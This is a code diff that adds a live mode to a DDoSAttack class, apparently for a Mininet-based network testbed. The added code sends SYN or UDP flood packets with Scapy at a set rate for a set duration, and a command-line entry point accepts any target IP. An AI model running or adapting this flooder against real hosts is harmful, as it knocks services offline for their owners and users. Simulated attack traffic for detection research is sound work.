@@ -289,3 +289,76 @@ class DDoSAttack:
             len(packets), self.config.attack_type, target,
         )
         return packets
+
+    def run_live(self, duration: int = 20, pps: Optional[int] = None) -> None:
+        """Send live attack traffic for *duration* seconds.
+
+        Continuously generates and sends Scapy packets at the configured
+        (or overridden) rate.  Designed to be called from the CLI entry
+        point inside the Mininet container.
+
+        Args:
+            duration: How many seconds to sustain the attack.
+            pps: Override packets-per-second (uses intensity profile if None).
+        """
+        from scapy.all import send
+
+        rate = pps or self.profile["packets_per_second"]
+        interval = 1.0 / max(rate, 1)
+        self.start()
+        logger.info(
+            "Live DDoS: type=%s, intensity=%s, duration=%ds, pps=%d",
+            self.config.attack_type, self.config.intensity, duration, rate,
+        )
+
+        deadline = time.time() + duration
+        sent = 0
+        while time.time() < deadline:
+            packets = self.generate_live_packets()
+            if packets is None:
+                logger.error("Scapy unavailable — aborting live DDoS")
+                break
+            for pkt in packets:
+                send(pkt, verbose=False)
+                sent += 1
+            time.sleep(interval)
+
+        self.stop()
+        logger.info("Live DDoS finished — %d packets sent in %ds", sent, duration)
+
+
+# ------------------------------------------------------------------
+# CLI entry point
+# Usage: docker exec mininet python3 /app/src/attacks/ddos.py --live
+# ------------------------------------------------------------------
+
+if __name__ == "__main__":
+    import argparse
+
+    parser = argparse.ArgumentParser(description="DDoS attack — live Scapy mode")
+    parser.add_argument("--live", action="store_true", required=True,
+                        help="Run in live mode (send real packets)")
+    parser.add_argument("--duration", type=int, default=20,
+                        help="Attack duration in seconds (default: 20)")
+    parser.add_argument("--intensity", choices=["low", "medium", "high"],
+                        default="medium", help="Attack intensity (default: medium)")
+    parser.add_argument("--type", choices=["syn_flood", "udp_flood"],
+                        default="syn_flood", dest="attack_type",
+                        help="DDoS variant (default: syn_flood)")
+    parser.add_argument("--target", default="10.0.0.1",
+                        help="Target IP (default: 10.0.0.1)")
+    args = parser.parse_args()
+
+    logging.basicConfig(
+        level=logging.INFO,
+        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
+        datefmt="%H:%M:%S",
+    )
+
+    config = DDoSConfig(
+        attack_type=args.attack_type,
+        intensity=args.intensity,
+        target_ip=args.target,
+    )
+    attack = DDoSAttack(config)
+    attack.run_live(duration=args.duration)
